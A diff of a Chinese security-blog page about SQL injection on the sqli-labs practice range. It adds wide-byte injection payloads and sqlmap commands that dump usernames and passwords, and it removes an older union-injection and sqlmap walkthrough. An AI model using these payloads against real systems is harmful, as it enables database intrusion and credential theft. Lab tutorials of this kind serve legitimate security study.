@@ -630,83 +612,67 @@
 	
 	
 ></p>
-<hr>
-<p>所以我们现在的需求就是去<code>information_schema.COLUMNS</code>表中查找<code>COLUMN_NAME</code>栏目来看看security里users这个表有哪些栏目，并且添加限定条件<code>TABLE_SCHEMA='security' and TABLE_NAME='users'</code>整合需求得到以下参数</p>
+<h3 id="小测验less-32">小测验（Less-32）
+</h3><p>使用刚才学习的宽字节注入轻松完成闭合并获取到了报错位：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="s1">&#39; union select 1,COLUMN_NAME,3 from information_schema.COLUMNS where TABLE_SCHEMA=&#39;</span><span class="nx">security</span><span class="s1">&#39; and TABLE_NAME=&#39;</span><span class="nx">users</span><span class="err">&#39;</span>  <span class="nx">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="o">--+</span>
-</span></span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=%</span><span class="n">df</span><span class="s1">&#39;union select 1,2,3 --+
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>依次修改limit的值发现有这三个栏目：<code>id  username password</code></p>
-<h3 id="step7全部取出username及对应password">Step7：全部取出username及对应password
-</h3><p><strong>补充6：</strong></p>
-<p>使用<code>group_concat(栏目名)</code>可以取出对应栏目的所有数据</p>
-<hr>
-<h4 id="方法一group_concat语法">方法一：group_concat()语法
-</h4><p>传入以下参数：</p>
+</div><p>接下来的操作就和第一关一样了。</p>
+<p>最终payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">2</span><span class="err">&#39;</span> <span class="nx">union</span> <span class="nx">select</span> <span class="mi">1</span><span class="p">,</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">username</span><span class="p">),</span><span class="nx">group_concat</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="nx">from</span> <span class="nx">users</span> <span class="o">--+</span>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=%</span><span class="n">df</span><span class="s1">&#39;union select 1,group_concat(username),group_concat(password) from users --+
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="使用sqlmap进行宽字节注入">使用sqlmap进行宽字节注入
+</h3><p><strong>新增参数：</strong><code>--tamper unmagicquotes</code>指加载unmagicquotes这个宽字节注入专用模型，其他没什么区别。</p>
+<p><strong>爆库名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.134/Less-32/?id=&#34;</span> --tamper unmagicquotes --current-db --batch
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>返回结果：</p>
-<p><img src="https://free.picui.cn/free/2025/11/28/69298f2006d9c.png"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
-<p>注：此方法在之前需要使用<code>limit</code>语法的地方也可尝试</p>
-<h4 id="方法二limit-ab-语法">方法二：limit a,b 语法
-</h4><p>适用情况：网站有输出长度限制</p>
-<p>与之前相同，在参数后面添加<code>limit 0,1</code>手动修改依次输出</p>
-<h2 id="工具辅助注入">工具辅助注入
-</h2><h3 id="sqlmap-用法使用kali版本">sqlmap 用法（使用Kali版本）
-</h3><p>慢速通用版：</p>
-<p>STEP1:<code>sqlmap -u [目标url] --dbs</code>也可使用<code>sqlmap -u [目标url] --current-db</code></p>
-<p>前者获取目标网站的所有库名，后者获取当前数据库名</p>
-<p>STEP2:<code>sqlmap -u [目标url] -D [库名] --tables</code></p>
-<p>获取指定库里的表</p>
-<p>STEP3:<code>sqlmap -u [目标url] -D [库名] -T [表名] --columns</code></p>
-<p>获取指定表里的栏目</p>
-<p>STEP4:<code>sqlmap -u [目标url] -D [库名] -T [表名] -C xxx,xxx --dump</code></p>
-<p>获取表里指定栏目的数据</p>
-<p>完毕</p>
-<p>快速版（也需要分步添加参数）：</p>
-<p><code>sqlmap -u [目标url] --dbs --batch --threads 10 --technique U</code></p>
-<p>使用sqlmap查看目标网站的数据库库名，忽略错误，开10线程，使用union select注入目标网站</p>
-<hr>
-<p><strong>补充：</strong></p>
-<p>&ndash;technique X 中后接参数的其他类型</p>
-<p>E = 报错注入 <em>error based</em>（无法发现报错位，但是数据库报错会出现）</p>
-<p>B = 布尔型注入 <em>booled based</em>（无法发现报错位，数据库闭合破坏也不出现，但是界面上只会出现<strong>有</strong>和<strong>没有</strong>东西两种情况）</p>
-<p>T = 布尔型时间盲注 <em>time based</em>（无法发现报错位，数据库闭合被破坏也不出现，界面上也没有出现消失东西的情况）</p>
-<h3 id="略微引申post类型的注入">略微引申：POST类型的注入
-</h3><p>以靶场<a class="link" href="http://sqlilabs.njhack.xyz/Less-11/index.php"  target="_blank" rel="noopener"
-    >http://sqlilabs.njhack.xyz/Less-11/index.php</a>为例</p>
-<p>STEP1：随便提交数据，使用burp suite抓包</p>
-<p>输入账号：admin1 密码：admin1</p>
-<p>抓包得到post内容<code>uname=admin1&amp;passwd=admin1&amp;submit=Submit</code></p>
-<p>STEP2：使用sqlmap注入</p>
-<p><code>sqlmap -u http://sqlilabs.njhack.xyz/Less-11/index.php --data &quot;uname=admin1*&amp;passwd=admin1&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique U</code></p>
-<p><strong><font style="color:#DF2A3F;">注意：&ndash;data后跟着的</font></strong><code>&quot;&quot;</code><strong><font style="color:#DF2A3F;">包裹字符串内容要在打击处用</font></strong><code>*</code><strong><font style="color:#DF2A3F;">做标记</font></strong></p>
-<p>接下来的步骤略</p>
-<h2 id="拓展知识">拓展知识
-</h2><p>web渗透中目标不同的组合：</p>
-<p>Windows+iss+asp/aspx(asp.net)+access/mssql</p>
-<p>Windows+apache+php+mysql = wamp （一般使用软件进行集成化搭建）</p>
-<p>linux+apache/nginx+php+mysql = lamp/lnmp （又可能使用宝塔或其他面板搭建）</p>
-<p>linux+tomcat+java(jsp)+oracle/mysql</p>
-<p>linux+nginx+python(django/flask/tornado/fastapi)+go(beego/gin)+mysql</p>
-<hr>
+</div><p><strong>爆表名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.134/Less-32/?id=&#34;</span> --tamper unmagicquotes -D security --tables --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆字段名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.134/Less-32/?id=&#34;</span> --tamper unmagicquotes -D security -T users --columns --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆字段数据：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -u <span class="s2">&#34;http://192.168.80.134/Less-32/?id=&#34;</span> --tamper unmagicquotes -D security -T users -C username,password --dump --batch
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="参考文献">参考文献
+</h2><p>[1] babers. 利用 insert、update 和 delete 注入获得数据 [EB/OL]. 2017-07-28. <a class="link" href="https://www.cnblogs.com/babers/articles/7252401.html."  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/babers/articles/7252401.html.</a> [2026-01-23]</p>
 
 </section>
 
@@ -769,12 +735,12 @@
             
                 
 <article class="">
-    <a href="/p/1.16-linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.16 Linux应急响应</h2>
+            <h2 class="article-title">1.22 SQL注入系列-2</h2>
         </div>
     </a>
 </article>
@@ -782,12 +748,12 @@
             
                 
 <article class="">
-    <a href="/p/1.15-dos%E8%A1%A5%E5%85%85%E5%92%8Cwin%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
+    <a href="/p/1.22.sp-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.15 DOS补充和Win应急响应</h2>
+            <h2 class="article-title">1.22.SP 奇技淫巧：SQL注入之数据外带</h2>
         </div>
     </a>
 </article>
@@ -795,12 +761,12 @@
             
                 
 <article class="">
-    <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">
+    <a href="/p/1.21-webshell-%E5%85%8D%E6%9D%80%E5%92%8C%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.14 自启动和DOS攻击初步</h2>
+            <h2 class="article-title">1.21 Webshell 免杀和正则表达式</h2>
         </div>
     </a>
 </article>
@@ -808,12 +774,12 @@
             
                 
 <article class="">
-    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
+    <a href="/p/1.19-xss-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.13  更多木马程序</h2>
+            <h2 class="article-title">1.19 XSS 注入攻击2与文件上传</h2>
         </div>
     </a>
 </article>
@@ -821,12 +787,12 @@
             
                 
 <article class="">
-    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
+    <a href="/p/1.18-xss%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">1.12 进阶后门操作</h2>
+            <h2 class="article-title">1.18 XSS注入攻击</h2>
         </div>
     </a>
 </article>
@@ -1117,8 +1083,12 @@
         
             
         
-        发表了98篇文章 · 
-        总计139.78k字
+            
+        
+            
+        
+        发表了100篇文章 · 
+        总计142.78k字
     </section>
 
 
